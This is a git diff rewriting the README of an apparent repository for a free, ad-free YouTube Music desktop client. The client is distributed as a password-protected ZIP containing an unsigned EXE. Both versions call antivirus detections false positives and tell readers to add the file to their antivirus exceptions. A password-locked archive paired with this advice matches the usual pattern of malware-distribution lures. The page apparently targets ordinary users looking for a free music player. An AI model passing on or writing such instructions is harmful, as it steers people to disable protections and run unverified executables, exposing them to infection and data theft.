@@ -1,81 +1,103 @@
-# 🎵 No ads, no subscription – YouTube Music player
+<p align="center">
+  <img src="assets/icon.png" width="128" alt="logo">
+</p>
 
-**A lightweight desktop player for YouTube Music. No login, no premium, no ads – just play.**
+<h1 align="center">🎵 YouTube Music, but free</h1>
+
+<p align="center">
+  <strong>No ads. No premium. No bullshit.</strong>
+</p>
+
+<p align="center">
+  <a href="https://github.com/sohaibdevv/youtube-music/releases/latest">
+    <img src="https://img.shields.io/badge/📦_Download_Latest-ytm4all-2ea44f?style=for-the-badge&logo=github" alt="Download">
+  </a>
+  <a href="https://github.com/sohaibdevv/youtube-music/releases">
+    <img src="https://img.shields.io/github/v/release/sohaibdevv/youtube-music?style=for-the-badge&label=Release&color=blue" alt="Release">
+  </a>
+  <a href="LICENSE">
+    <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License">
+  </a>
+  <a href="https://github.com/sohaibdevv/youtube-music/issues">
+    <img src="https://img.shields.io/github/issues/sohaibdevv/youtube-music?style=for-the-badge&color=red" alt="Issues">
+  </a>
+</p>
+
+<img width="1917" height="1080" alt="image" src="https://github.com/user-attachments/assets/cf67e412-2ef2-4292-9ac1-c76039ad983e" />
+
 
 ---
 
-## Screenshot
+## ✨ Features
 
-<img width="1917" height="1080" alt="image" src="https://github.com/user-attachments/assets/8ab45aca-d246-4bee-9e63-0b7ce5a8a22d" />
-
----
-
-## Features
-
-- 🚫 **No ads** – uninterrupted listening
-- 🔄 **Background playback** – music keeps playing when minimized
-- 🔍 **Search** – find tracks, artists, albums instantly
-- 📂 **Local playlists** – save your queues, no cloud sync, no tracking
-- 🌙 **Dark theme** – switches automatically or manually
-- ⌨️ **Media keys** – Play/Pause, Next, Previous from your keyboard
-- 📦 **Portable** – single EXE file, nothing installed on your system
+|  |  |
+| --- | --- |
+| 🚫 **No ads** | Uninterrupted listening |
+| 🔄 **Background playback** | Music keeps playing when minimized |
+| 🔍 **Search** | Find tracks, artists, albums instantly |
+| 📂 **Local playlists** | Save queues – no tracking |
+| 🌙 **Dark theme** | Auto or manual |
+| ⌨️ **Media keys** | Play/Pause, Next, Previous |
+| 📦 **Portable** | Single EXE – no install |
 
 ---
 
-## Download
+## 📦 Download
 
-Get the latest release from the **Releases** section:  
-`youtube-music-free.zip`
+<p align="center">
+  <a href="https://github.com/sohaibdevv/youtube-music/releases/latest">
+    <img src="https://img.shields.io/badge/⬇️_Download_youtube--music--free.zip-2ea44f?style=for-the-badge&logo=github" alt="Download ZIP">
+  </a>
+</p>
 
-Inside the archive you'll find one file:  
-`youtube-music-free.exe`
+Inside: **`youtube-music-free.exe`**
 
 ---
 
 ## 🔐 Password
 
-The archive is password-protected. Use this to extract:
+<p align="center">
+  <code style="font-size: 1.5em; background: #222; color: #0f0; padding: 10px 30px; border-radius: 8px;">ytm4all</code>
+</p>
 
-**Password:** `ytm4all`
-
-> Case‑sensitive. Type it exactly as shown.
-
----
-
-## How to use
-
-1. Download the ZIP archive.  
-2. Unzip it using the password above.  
-3. Double‑click `youtube-music-free.exe` – no installation needed.  
-4. Search for any track, artist, or album and hit Play.
-
-That's it. The app doesn't write anything to your registry or system folders – just delete the folder when you're done.
+> Case‑sensitive.
 
 ---
 
-## ❓ Antivirus warning?
+## 🚀 How to use
 
-Some antivirus software may flag the EXE as suspicious. This is a **false positive** – it happens because the app is built with PyInstaller and isn't digitally signed.
+1. ⬇️ Download the ZIP  
+2. 🔓 Unzip with password `ytm4all`  
+3. 🖱️ Run **`youtube-music-free.exe`**  
+4. 🔎 Search and play
 
-If you downloaded the file from this official repository, you can safely add it to your antivirus exceptions.
+No install, no registry, no leftovers.
+
+---
+
+## ❓ Antivirus false positive?
+
+Some antiviruses may flag it – it's a **false positive** (PyInstaller + no signature). If you downloaded from this repo, add to exceptions.
 
 ---
 
 ## ⚠️ Disclaimer
 
-- This project is **not affiliated with Google LLC** or YouTube.  
-- All media content belongs to its respective copyright holders.  
-- This client streams audio in the same way a browser does – it does **not** download videos or bypass DRM.  
-- Use it responsibly and respect copyright laws.
+Not affiliated with Google. All rights belong to owners. Streams audio like a browser – no downloading, no DRM bypass. Use responsibly.
 
 ---
 
-## License
+## 📄 License
 
-MIT – free to use, modify, and share.
+MIT
 
 ---
 
-**Archive:** `youtube-music-free.zip`  
-**Executable inside:** `youtube-music-free.exe`  
-**Archive password:** `ytm4all`
+<p align="center">
+  <a href="https://github.com/sohaibdevv/youtube-music">
+    <img src="https://img.shields.io/github/stars/sohaibdevv/youtube-music?style=social" alt="Stars">
+  </a>
+  <a href="https://github.com/sohaibdevv/youtube-music/forks">
+    <img src="https://img.shields.io/github/forks/sohaibdevv/youtube-music?style=social" alt="Forks">
+  </a>
+</p>
